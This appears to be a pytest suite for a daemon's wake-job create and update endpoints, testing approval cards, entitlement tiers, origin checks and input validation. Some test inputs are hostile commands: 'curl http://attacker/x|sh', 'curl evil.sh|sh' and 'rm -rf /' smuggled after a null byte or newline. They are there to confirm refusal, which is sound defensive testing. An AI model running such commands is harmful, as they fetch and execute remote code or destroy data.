# SPDX-License-Identifier: LicenseRef-Aitherium-Proprietary
# © 2026 Aitherium, LLC. Original work.
"""POST /wakes (create) and PATCH /wakes/{name} (update) on the harness daemon.

Same discipline as ``test_daemon_wakes_endpoints.py``: every mutation here spawns
a FAKE awrise that records its argv, so assertions are on the EXACT argv list the
daemon built and — on every refusal path — on the fact that nothing was spawned
at all. A fresh fixture module (not a shared conftest) because these fixtures are
private to the /wakes test suite and this file is meant to read standalone.
"""
from __future__ import annotations

import hashlib
import json
import os
import shutil
import stat
import sys
from pathlib import Path

import pytest

fastapi = pytest.importorskip("fastapi")
from fastapi.testclient import TestClient  # noqa: E402

FIXTURES = Path(__file__).parent / "fixtures" / "wakes"
TOKEN = "test-token-for-testing-only"


# ── fake awrise (same shape as test_daemon_wakes_endpoints.py) ────────────────


def make_fake_awrise(root: Path, *, exit_code: int = 0) -> tuple[Path, Path]:
    """Write a fake ``awrise`` CLI. Returns (binary, argv capture file)."""
    capture = root / "argv.jsonl"
    script = root / "fake_awrise.py"
    script.write_text(
        "import json, sys\n"
        f"open({str(capture)!r}, 'a', encoding='utf-8').write(json.dumps(sys.argv[1:]) + '\\n')\n"
        "print('fake awrise: ' + ' '.join(sys.argv[1:]))\n"
        "sys.stderr.write('fake stderr\\n')\n"
        f"sys.exit({int(exit_code)})\n",
        encoding="utf-8",
    )
    if os.name == "nt":
        binary = root / "awrise.cmd"
        binary.write_text(
            f'@echo off\r\n"{sys.executable}" "{script}" %*\r\nexit /b %ERRORLEVEL%\r\n',
            encoding="utf-8",
        )
    else:
        binary = root / "awrise"
        binary.write_text(f'#!/bin/sh\nexec "{sys.executable}" "{script}" "$@"\n',
                          encoding="utf-8")
        binary.chmod(binary.stat().st_mode | stat.S_IXUSR)
    return binary, capture


def spawned(capture: Path) -> list[list[str]]:
    if not capture.exists():
        return []
    return [json.loads(line) for line in capture.read_text(encoding="utf-8").splitlines()
            if line.strip()]


def _abs(p: Path) -> str:
    return os.path.abspath(str(p))


# ── fixtures ─────────────────────────────────────────────────────────────────


@pytest.fixture
def home(tmp_path, monkeypatch) -> Path:
    """A schema-2 AWRISE_HOME with the fixture jobs, pointed at by env."""
    base = tmp_path / "awrise"
    base.mkdir()
    shutil.copy(FIXTURES / "jobs_v2.json", base / "jobs.json")
    shutil.copytree(FIXTURES / "ledger", base / "ledger")
    monkeypatch.setenv("AWRISE_HOME", str(base))
    return base


@pytest.fixture
def fake(tmp_path, monkeypatch) -> dict:
    """A fake awrise on AWRISE_BIN (exit 0). Tests re-point AWRISE_BIN as needed."""
    root = tmp_path / "fake"
    root.mkdir()
    binary, capture = make_fake_awrise(root, exit_code=0)
    monkeypatch.setenv("AWRISE_BIN", str(binary))
    return {"root": root, "binary": binary, "capture": capture}


@pytest.fixture
def client(tmp_path, monkeypatch):
    monkeypatch.setenv("AITHER_DECISIONS_DIR", str(tmp_path / "decisions"))
    monkeypatch.setenv("AITHER_STEER_DIR", str(tmp_path / "steer"))
    monkeypatch.setenv("AITHER_HARNESS_TOKEN", TOKEN)
    monkeypatch.setenv("AITHER_HARNESS_PRINCIPALS", str(tmp_path / "harness_tokens.json"))
    # `get_store()` is a process-wide singleton (gate 1k: this file now raises
    # decision cards, which touches it). Without this reset, whichever test —
    # in ANY file — happens to call it first wins the tmp_path for the rest of
    # the process, and every test after it silently shares one store instead
    # of the isolated one its own `AITHER_DECISIONS_DIR` implies.
    import adk.decisions.store as decision_store
    import adk.harnesses.daemon as daemon

    monkeypatch.setattr(decision_store, "_STORE", None)
    monkeypatch.setattr(daemon, "PRINCIPALS_PATH", tmp_path / "harness_tokens.json")
    daemon._RUNNING.clear()
    app = daemon.create_app()
    c = TestClient(app)
    c.headers = {"Authorization": f"Bearer {TOKEN}"}
    return c


# ── POST /wakes (create) ────────────────────────────────────────────────────


class TestWakeCreate:
    """POST /wakes never spawns. It PROPOSES a 'wakes-add' card (202 pending);
    ``TestWakeCreateCardLifecycle`` below answers it and asserts the spawn."""

    def test_create_raises_a_card_no_spawn(self, client, home, fake):
        resp = client.post("/wakes", json={
            "name": "new-job", "command": "python new.py", "every": "2h",
        })
        assert resp.status_code == 202, resp.text
        data = resp.json()
        assert data["ok"] is True and data["pending"] is True
        assert data["action"] == "add" and data["name"] == "new-job"
        card = data["card"]
        assert card["card_recipe"] == "wakes-add"
        assert card["status"] == "open"
        assert card["recipe_vars"]["name"] == "new-job"
        assert card["recipe_vars"]["command"] == "python new.py"
        assert card["recipe_vars"]["every"] == "2h"
        assert card["dedupe_key"] == "awrise:wakes-add:new-job"
        # The job must not exist yet — nothing has been spawned.
        assert spawned(fake["capture"]) == []

    def test_create_with_timeout_and_cwd_still_no_spawn(self, client, home, fake):
        resp = client.post("/wakes", json={
            "name": "new-job", "command": "echo hi", "every": "5m",
            "timeout": 60, "cwd": "/srv/app",
        })
        assert resp.status_code == 202, resp.text
        card = resp.json()["card"]
        assert card["recipe_vars"]["timeout"] == "60"
        assert card["recipe_vars"]["cwd"] == "/srv/app"
        assert spawned(fake["capture"]) == []

    def test_retrying_the_same_create_dedupes_to_one_card(self, client, home, fake):
        """A caller that retries POST /wakes for the same name answers the
        ONE open card instead of stacking a second (and a second ask the
        owner never gets to see)."""
        first = client.post("/wakes", json={
            "name": "new-job", "command": "echo hi", "every": "5m",
        })
        second = client.post("/wakes", json={
            "name": "new-job", "command": "echo hi (retried)", "every": "5m",
        })
        assert first.status_code == 202 and second.status_code == 202
        assert second.json()["card"]["id"] == first.json()["card"]["id"]
        assert second.json()["card"]["deduped"] is True
        assert spawned(fake["capture"]) == []

    def test_create_already_exists_409_no_spawn(self, client, home, fake):
        resp = client.post("/wakes", json={
            "name": "nightly-sync", "command": "echo hi", "every": "5m",
        })
        assert resp.status_code == 409
        assert "nightly-sync" in resp.json()["detail"]
        assert spawned(fake["capture"]) == []

    def test_missing_required_fields_422_no_spawn(self, client, home, fake):
        for body in ({"command": "x", "every": "5m"},   # no name
                     {"name": "x", "every": "5m"},        # no command
                     {"name": "x", "command": "x"}):       # no every
            resp = client.post("/wakes", json=body)
            assert resp.status_code == 422, body
        assert spawned(fake["capture"]) == []

    def test_bad_name_400_no_spawn(self, client, home, fake):
        for name in ("-name", ".hidden", "a b", "../x"):
            resp = client.post("/wakes", json={
                "name": name, "command": "echo hi", "every": "5m",
            })
            assert resp.status_code == 400, name
        assert spawned(fake["capture"]) == []

    def test_empty_command_400_no_spawn(self, client, home, fake):
        resp = client.post("/wakes", json={
            "name": "new-job", "command": "", "every": "5m",
        })
        assert resp.status_code == 400
        assert "command" in resp.json()["detail"]
        assert spawned(fake["capture"]) == []

    def test_control_byte_in_command_400_no_spawn(self, client, home, fake):
        resp = client.post("/wakes", json={
            "name": "new-job", "command": "echo hi\x00rm -rf /", "every": "5m",
        })
        assert resp.status_code == 400
        assert spawned(fake["capture"]) == []

    def test_oversized_command_400_no_spawn(self, client, home, fake):
        resp = client.post("/wakes", json={
            "name": "new-job", "command": "x" * 4097, "every": "5m",
        })
        assert resp.status_code == 400
        assert spawned(fake["capture"]) == []

    def test_control_byte_in_every_400_no_spawn(self, client, home, fake):
        resp = client.post("/wakes", json={
            "name": "new-job", "command": "echo hi", "every": "5m\n--disabled",
        })
        assert resp.status_code == 400
        assert spawned(fake["capture"]) == []

    def test_control_byte_in_cwd_400_no_spawn(self, client, home, fake):
        resp = client.post("/wakes", json={
            "name": "new-job", "command": "echo hi", "every": "5m", "cwd": "/x\x00y",
        })
        assert resp.status_code == 400
        assert spawned(fake["capture"]) == []

    def test_bad_timeout_type_400_no_spawn(self, client, home, fake):
        # 0/-1 are rejected by the daemon's own positive-int check; "abc" is
        # rejected by pydantic before the handler runs — a numeric STRING like
        # "60" is deliberately not tested here, since pydantic lenient-coerces
        # it to int 60, which is a legitimate positive timeout.
        for timeout in (0, -1, "abc"):
            resp = client.post("/wakes", json={
                "name": "new-job", "command": "echo hi", "every": "5m", "timeout": timeout,
            })
            assert resp.status_code in (400, 422), timeout
        assert spawned(fake["capture"]) == []

    def test_payload_cannot_name_scope(self, client, home, fake):
        for extra in ({"home": "x"}, {"bin": "x"}, {"argv": ["x"]}, {"env": {"A": "1"}}):
            body = {"name": "new-job", "command": "echo hi", "every": "5m", **extra}
            resp = client.post("/wakes", json=body)
            assert resp.status_code == 422, extra
        assert spawned(fake["capture"]) == []

    def test_awrise_grammar_error_surfaces_only_once_the_card_is_answered(
            self, client, home, fake, monkeypatch):
        """awrise's OWN grammar check for `every` still runs in the spawned
        process — but that process is not spawned until the card is answered.
        POST /wakes itself never sees the exit code; it only offers the ask."""
        root = fake["root"] / "e1"
        root.mkdir()
        binary, capture = make_fake_awrise(root, exit_code=1)
        monkeypatch.setenv("AWRISE_BIN", str(binary))
        raised = client.post("/wakes", json={
            "name": "new-job", "command": "echo hi", "every": "not-a-real-interval",
        })
        assert raised.status_code == 202, raised.text
        assert spawned(capture) == [], "the exit-1 grammar error must not be reachable pre-answer"

        card_id = raised.json()["card"]["id"]
        answered = client.post(f"/decisions/{card_id}/answer", json={"choice": "create"})
        assert answered.status_code == 200, answered.text
        assert spawned(capture) == [[
            "add", "--name", "new-job", "--every", "not-a-real-interval", "--run", "echo hi",
        ]]
        notes = [n["text"] for n in answered.json()["decision"]["notes"]]
        assert any("Steerback FAILED" in n and "exit 1" in n for n in notes), notes

    def test_no_bearer_401_no_spawn(self, client, home, fake):
        client.headers = {}
        resp = client.post("/wakes", json={
            "name": "new-job", "command": "echo hi", "every": "5m",
        })
        assert resp.status_code == 401
        assert spawned(fake["capture"]) == []

    def test_not_installed_503_no_spawn(self, client, tmp_path, fake, monkeypatch):
        monkeypatch.setenv("AWRISE_HOME", str(tmp_path / "nowhere"))
        resp = client.post("/wakes", json={
            "name": "new-job", "command": "echo hi", "every": "5m",
        })
        assert resp.status_code == 503
        assert spawned(fake["capture"]) == []

    def test_entitlement_required(self, client, home, fake, tmp_path):
        limited = "limited-token-for-testing"
        registry = {hashlib.sha256(limited.encode()).hexdigest(): {
            "principal": "limited", "plan": "free", "entitlements": ["decisions"]}}
        (tmp_path / "harness_tokens.json").write_text(json.dumps(registry))
        client.headers = {"Authorization": f"Bearer {limited}"}
        resp = client.post("/wakes", json={
            "name": "new-job", "command": "echo hi", "every": "5m",
        })
        assert resp.status_code == 403
        assert "wakes:create" in resp.json()["detail"]
        assert spawned(fake["capture"]) == []

    def test_wakes_mutate_alone_cannot_raise_a_create_card(self, client, home, fake, tmp_path):
        """The whole point of the stricter tier: a principal entitled to turn
        an already-vetted job on/off must not be able to PROPOSE a brand new
        one."""
        limited = "mutate-only-token-for-testing"
        registry = {hashlib.sha256(limited.encode()).hexdigest(): {
            "principal": "mutate-only", "plan": "pro", "entitlements": ["wakes:mutate"]}}
        (tmp_path / "harness_tokens.json").write_text(json.dumps(registry))
        client.headers = {"Authorization": f"Bearer {limited}"}
        resp = client.post("/wakes", json={
            "name": "new-job", "command": "echo hi", "every": "5m",
        })
        assert resp.status_code == 403
        assert "wakes:create" in resp.json()["detail"]
        assert spawned(fake["capture"]) == []


class TestWakeCreateOrigin:
    """Same owner-bound origin re-authorization the existing mutations apply."""

    def _channels(self, tmp_path, owner: str = "111", dm: bool = True) -> None:
        d = tmp_path / "decisions"
        d.mkdir(exist_ok=True)
        (d / "channels.json").write_text(json.dumps({"discord": {
            "enabled": True, "owner_user_id": owner, "require_direct_message": dm}}))

    def _body(self, user_id: str = "111", dm: bool = True) -> dict:
        return {
            "name": "new-job", "command": "echo hi", "every": "5m",
            "origin": {"platform": "discord", "user_id": user_id, "is_direct_message": dm},
        }

    def test_mismatched_owner_403_no_spawn(self, client, home, fake, tmp_path):
        self._channels(tmp_path, owner="999")
        resp = client.post("/wakes", json=self._body("111"))
        assert resp.status_code == 403
        assert resp.json()["detail"]["error"] == "origin not authorized"
        assert spawned(fake["capture"]) == []

    def test_matching_owner_dm_raises_a_card_carrying_the_via(self, client, home, fake, tmp_path):
        self._channels(tmp_path, owner="111")
        resp = client.post("/wakes", json=self._body("111"))
        assert resp.status_code == 202, resp.text
        card = resp.json()["card"]
        assert card["recipe_vars"]["requested_by"] == "owner:discord:111"
        assert spawned(fake["capture"]) == []


# ── PATCH /wakes/{name} (update) ────────────────────────────────────────────


class TestWakeUpdate:
    def test_update_command_raises_a_card_no_spawn(self, client, home, fake):
        """A command change is the SAME capability POST /wakes grants — it
        never spawns directly either. ``TestWakeUpdateCommandCardLifecycle``
        below answers the card and asserts the eventual spawn."""
        resp = client.patch("/wakes/nightly-sync", json={"command": "python sync2.py"})
        assert resp.status_code == 202, resp.text
        data = resp.json()
        assert data["ok"] is True and data["pending"] is True
        assert data["action"] == "set" and data["name"] == "nightly-sync"
        card = data["card"]
        assert card["card_recipe"] == "wakes-set-command"
        assert card["recipe_vars"]["name"] == "nightly-sync"
        assert card["recipe_vars"]["command"] == "python sync2.py"
        assert spawned(fake["capture"]) == []

    def test_update_every_and_timeout_and_cwd(self, client, home, fake):
        resp = client.patch("/wakes/nightly-sync", json={
            "every": "6h", "timeout": 120, "cwd": "/srv/app",
        })
        assert resp.status_code == 200, resp.text
        assert set(resp.json()["updated_fields"]) == {"every", "timeout", "cwd"}
        assert spawned(fake["capture"]) == [[
            "set", "--name", "nightly-sync",
            "every=6h", "timeout_s=120", "cwd=/srv/app",
        ]]

    def test_no_fields_400_no_spawn(self, client, home, fake):
        resp = client.patch("/wakes/nightly-sync", json={})
        assert resp.status_code == 400
        assert "no fields" in resp.json()["detail"]
        assert spawned(fake["capture"]) == []

    def test_unknown_job_404_no_spawn(self, client, home, fake):
        resp = client.patch("/wakes/typo", json={"command": "echo hi"})
        assert resp.status_code == 404
        assert spawned(fake["capture"]) == []

    def test_bad_name_400_no_spawn(self, client, home, fake):
        assert client.patch("/wakes/-name", json={"command": "echo hi"}).status_code == 400
        assert client.patch("/wakes/.hidden", json={"command": "echo hi"}).status_code == 400
        assert spawned(fake["capture"]) == []

    def test_control_byte_in_command_400_no_spawn(self, client, home, fake):
        resp = client.patch("/wakes/nightly-sync", json={"command": "echo hi\nrm -rf /"})
        assert resp.status_code == 400
        assert spawned(fake["capture"]) == []

    def test_empty_command_400_no_spawn(self, client, home, fake):
        resp = client.patch("/wakes/nightly-sync", json={"command": ""})
        assert resp.status_code == 400
        assert spawned(fake["capture"]) == []

    def test_oversized_every_400_no_spawn(self, client, home, fake):
        resp = client.patch("/wakes/nightly-sync", json={"every": "x" * 257})
        assert resp.status_code == 400
        assert spawned(fake["capture"]) == []

    def test_bad_timeout_type_400_no_spawn(self, client, home, fake):
        for timeout in (0, -5, "abc"):
            resp = client.patch("/wakes/nightly-sync", json={"timeout": timeout})
            assert resp.status_code in (400, 422), timeout
        assert spawned(fake["capture"]) == []

    def test_nonzero_exit_surfaces_only_once_the_card_is_answered(
            self, client, home, fake, monkeypatch):
        root = fake["root"] / "e3"
        root.mkdir()
        binary, capture = make_fake_awrise(root, exit_code=3)
        monkeypatch.setenv("AWRISE_BIN", str(binary))
        raised = client.patch("/wakes/nightly-sync", json={"command": "echo hi"})
        assert raised.status_code == 202, raised.text
        assert spawned(capture) == []

        card_id = raised.json()["card"]["id"]
        answered = client.post(f"/decisions/{card_id}/answer", json={"choice": "apply"})
        assert answered.status_code == 200, answered.text
        assert spawned(capture) == [["set", "--name", "nightly-sync", "run=echo hi"]]
        notes = [n["text"] for n in answered.json()["decision"]["notes"]]
        assert any("Steerback FAILED" in n and "exit 3" in n for n in notes), notes

    def test_no_bearer_401_no_spawn(self, client, home, fake):
        client.headers = {}
        resp = client.patch("/wakes/nightly-sync", json={"command": "echo hi"})
        assert resp.status_code == 401
        assert spawned(fake["capture"]) == []

    def test_not_installed_503_no_spawn(self, client, tmp_path, fake, monkeypatch):
        monkeypatch.setenv("AWRISE_HOME", str(tmp_path / "nowhere"))
        resp = client.patch("/wakes/nightly-sync", json={"command": "echo hi"})
        assert resp.status_code == 503
        assert spawned(fake["capture"]) == []

    def test_entitlement_required(self, client, home, fake, tmp_path):
        limited = "limited-token-for-testing"
        registry = {hashlib.sha256(limited.encode()).hexdigest(): {
            "principal": "limited", "plan": "free", "entitlements": ["decisions"]}}
        (tmp_path / "harness_tokens.json").write_text(json.dumps(registry))
        client.headers = {"Authorization": f"Bearer {limited}"}
        resp = client.patch("/wakes/nightly-sync", json={"command": "echo hi"})
        assert resp.status_code == 403
        assert "wakes:mutate" in resp.json()["detail"]
        assert spawned(fake["capture"]) == []

    def test_payload_cannot_name_scope(self, client, home, fake):
        for extra in ({"home": "x"}, {"bin": "x"}, {"argv": ["x"]}):
            body = {"command": "echo hi", **extra}
            resp = client.patch("/wakes/nightly-sync", json=body)
            assert resp.status_code == 422, extra
        assert spawned(fake["capture"]) == []


class TestWakeUpdateOrigin:
    def _channels(self, tmp_path, owner: str = "111", dm: bool = True) -> None:
        d = tmp_path / "decisions"
        d.mkdir(exist_ok=True)
        (d / "channels.json").write_text(json.dumps({"discord": {
            "enabled": True, "owner_user_id": owner, "require_direct_message": dm}}))

    def test_mismatched_owner_403_no_spawn(self, client, home, fake, tmp_path):
        self._channels(tmp_path, owner="999")
        resp = client.patch("/wakes/nightly-sync", json={
            "command": "echo hi",
            "origin": {"platform": "discord", "user_id": "111", "is_direct_message": True},
        })
        assert resp.status_code == 403
        assert spawned(fake["capture"]) == []

    def test_matching_owner_dm_raises_a_card_carrying_the_via(self, client, home, fake, tmp_path):
        self._channels(tmp_path, owner="111")
        resp = client.patch("/wakes/nightly-sync", json={
            "command": "echo hi",
            "origin": {"platform": "discord", "user_id": "111", "is_direct_message": True},
        })
        assert resp.status_code == 202, resp.text
        card = resp.json()["card"]
        assert card["recipe_vars"]["requested_by"] == "owner:discord:111"
        assert spawned(fake["capture"]) == []


class TestWakeCreateUpdateRouteShape:
    def test_cors_allows_patch(self):
        import adk.harnesses.daemon as daemon

        src = Path(daemon.__file__).read_text(encoding="utf-8")
        assert '"PATCH"' in src

    def test_create_and_update_carry_the_entitlement_gate(self):
        """The decorator itself carries no dependency on these two routes (unlike
        the read-only GETs' ``dependencies=[Depends(auth)]``) — the gate lives on
        the handler's own ``principal: Principal = Depends(require_entitlement(...))``
        parameter, so this asserts on the FUNCTION BODY, not just the decorator.

        ``create_wake`` carries the STRICTER ``wakes:create`` (it can only ever
        PROPOSE a new command, never spawn one) — never the flat ``wakes:mutate``
        enable/disable/run use. ``update_wake`` carries ``wakes:mutate`` at the
        route level (every/timeout/cwd stay synchronous under it) PLUS an inline
        ``wakes:create`` check the moment the body carries a ``command`` — see
        ``TestWakeUpdateCommandCardLifecycle`` for the behavioural proof that a
        ``wakes:mutate``-only principal is refused there.
        """
        import adk.harnesses.daemon as daemon

        src = Path(daemon.__file__).read_text(encoding="utf-8")
        create_pos = src.index('@app.post("/wakes")')
        create_end = src.index("\n    @app.", src.index("def create_wake", create_pos))
        update_pos = src.index('@app.patch("/wakes/{name}")')
        update_end = src.index("\n    @app.", src.index("def update_wake", update_pos))
        assert 'require_entitlement("wakes:create")' in src[create_pos:create_end]
        assert 'require_entitlement("wakes:mutate")' not in src[create_pos:create_end]
        assert 'require_entitlement("wakes:mutate")' in src[update_pos:update_end]
        assert '_require_wakes_create(principal)' in src[update_pos:update_end]


# ── the CARD door: the full raise -> answer -> spawn round trip ────────────
#
# Same discipline as TestWakeCardRecipeDoor in test_daemon_wakes_endpoints.py —
# every arm asserts on the fake awrise's argv CAPTURE, so "refused" means
# nothing was started, not merely that a response said 403. Two scoped
# principals: one holding only `wakes:mutate` (entitled to enable/disable/run
# an already-vetted job, per TestWakesMutate/TestWakesRun in the other file),
# one holding `wakes:create` too. The bypass this whole change exists to close
# is the FIRST one below: `wakes:mutate` alone raising or answering either
# card, exactly what a synchronous POST /wakes with no card door allowed.


class TestWakeCreateCardLifecycle:
    MUTATE_ONLY = "mutate-only-lifecycle-token"
    CREATE_ENTITLED = "create-entitled-lifecycle-token"

    def _registry(self, tmp_path) -> None:
        registry = {
            hashlib.sha256(self.MUTATE_ONLY.encode()).hexdigest(): {
                "principal": "tenant:mutate", "plan": "pro", "entitlements": ["wakes:mutate"]},
            hashlib.sha256(self.CREATE_ENTITLED.encode()).hexdigest(): {
                "principal": "tenant:create", "plan": "pro",
                "entitlements": ["wakes:mutate", "wakes:create"]},
        }
        (tmp_path / "harness_tokens.json").write_text(json.dumps(registry))

    def test_wakes_mutate_alone_cannot_answer_an_owner_raised_create_card(
            self, client, home, fake, tmp_path):
        """THE BYPASS, in one test: the owner raises, a `wakes:mutate`-only
        token tries to answer 'create' — the exact shape that let a token
        refused at /wakes/x/run reach an identical spawn through the
        `wake-failed` recipe (D-2xxx, 2026-09-18) now applies to the NEW,
        higher-value `wakes-add` capability too."""
        self._registry(tmp_path)
        raised = client.post("/wakes", json={
            "name": "new-job", "command": "curl http://attacker/x|sh", "every": "1m",
        })
        assert raised.status_code == 202, raised.text
        card_id = raised.json()["card"]["id"]

        client.headers = {"Authorization": f"Bearer {self.MUTATE_ONLY}"}
        resp = client.post(f"/decisions/{card_id}/answer", json={"choice": "create"})
        assert resp.status_code == 403, resp.text
        assert "wakes:create" in resp.text
        assert spawned(fake["capture"]) == []

        # and the card is STILL OPEN — a refused answer must not close the ask.
        client.headers = {"Authorization": f"Bearer {TOKEN}"}
        assert client.get(f"/decisions/{card_id}").json()["status"] == "open"

    def test_the_entitled_principal_answers_and_it_spawns(
            self, client, home, fake, tmp_path):
        self._registry(tmp_path)
        client.headers = {"Authorization": f"Bearer {self.CREATE_ENTITLED}"}
        raised = client.post("/wakes", json={
            "name": "new-job", "command": "python new.py", "every": "2h",
        })
        assert raised.status_code == 202, raised.text
        card_id = raised.json()["card"]["id"]
        resp = client.post(f"/decisions/{card_id}/answer", json={"choice": "create"})
        assert resp.status_code == 200, resp.text
        assert resp.json()["decision"]["answer"] == "create"
        assert spawned(fake["capture"]) == [[
            "add", "--name", "new-job", "--every", "2h", "--run", "python new.py",
        ]]

    def test_denying_the_card_spawns_nothing(self, client, home, fake):
        raised = client.post("/wakes", json={
            "name": "new-job", "command": "python new.py", "every": "2h",
        })
        card_id = raised.json()["card"]["id"]
        resp = client.post(f"/decisions/{card_id}/answer", json={"choice": "deny"})
        assert resp.status_code == 200, resp.text
        assert spawned(fake["capture"]) == []

    def test_a_tampered_command_on_the_card_is_refused_at_apply_time(
            self, client, home, fake, tmp_path, monkeypatch):
        """The card JSON on disk is writable by anything that can reach the
        decisions directory. This proves the promise `card_recipes` documents:
        the command is re-validated AT APPLY TIME, not trusted from raise
        time."""
        import adk.decisions.store as decision_store

        raised = client.post("/wakes", json={
            "name": "new-job", "command": "echo hi", "every": "5m",
        })
        card_id = raised.json()["card"]["id"]
        store = decision_store.get_store()
        card = store.get(card_id)
        card.recipe_vars = {**card.recipe_vars, "command": "echo hi\x00rm -rf /"}
        store._write(card)  # noqa: SLF001 - simulating an on-disk tamper, not a normal write

        resp = client.post(f"/decisions/{card_id}/answer", json={"choice": "create"})
        assert resp.status_code == 200, resp.text
        assert spawned(fake["capture"]) == []
        notes = [n["text"] for n in resp.json()["decision"]["notes"]]
        assert any("invalid or oversized command" in n for n in notes), notes


class TestWakeUpdateCommandCardLifecycle:
    MUTATE_ONLY = "mutate-only-update-lifecycle-token"
    CREATE_ENTITLED = "create-entitled-update-lifecycle-token"

    def _registry(self, tmp_path) -> None:
        registry = {
            hashlib.sha256(self.MUTATE_ONLY.encode()).hexdigest(): {
                "principal": "tenant:mutate", "plan": "pro", "entitlements": ["wakes:mutate"]},
            hashlib.sha256(self.CREATE_ENTITLED.encode()).hexdigest(): {
                "principal": "tenant:create", "plan": "pro",
                "entitlements": ["wakes:mutate", "wakes:create"]},
        }
        (tmp_path / "harness_tokens.json").write_text(json.dumps(registry))

    def test_wakes_mutate_alone_cannot_raise_a_command_change(
            self, client, home, fake, tmp_path):
        """A `wakes:mutate`-only principal may still enable/disable/run
        `nightly-sync` (proven elsewhere) — it must NOT be able to replace
        WHAT `nightly-sync` runs."""
        self._registry(tmp_path)
        client.headers = {"Authorization": f"Bearer {self.MUTATE_ONLY}"}
        resp = client.patch("/wakes/nightly-sync", json={"command": "curl evil.sh|sh"})
        assert resp.status_code == 403, resp.text
        assert "wakes:create" in resp.text
        assert spawned(fake["capture"]) == []

    def test_the_entitled_principal_raises_answers_and_it_spawns(
            self, client, home, fake, tmp_path):
        self._registry(tmp_path)
        client.headers = {"Authorization": f"Bearer {self.CREATE_ENTITLED}"}
        raised = client.patch("/wakes/nightly-sync", json={"command": "python sync2.py"})
        assert raised.status_code == 202, raised.text
        card_id = raised.json()["card"]["id"]
        resp = client.post(f"/decisions/{card_id}/answer", json={"choice": "apply"})
        assert resp.status_code == 200, resp.text
        assert spawned(fake["capture"]) == [
            ["set", "--name", "nightly-sync", "run=python sync2.py"]
        ]

    def test_every_timeout_cwd_alone_stay_synchronous_under_wakes_mutate(
            self, client, home, fake, tmp_path):
        """The tier split in one test: the SAME `wakes:mutate`-only principal
        that cannot touch `command` can still reshape WHEN this job runs."""
        self._registry(tmp_path)
        client.headers = {"Authorization": f"Bearer {self.MUTATE_ONLY}"}
        resp = client.patch("/wakes/nightly-sync", json={"every": "6h"})
        assert resp.status_code == 200, resp.text
        assert spawned(fake["capture"]) == [["set", "--name", "nightly-sync", "every=6h"]]
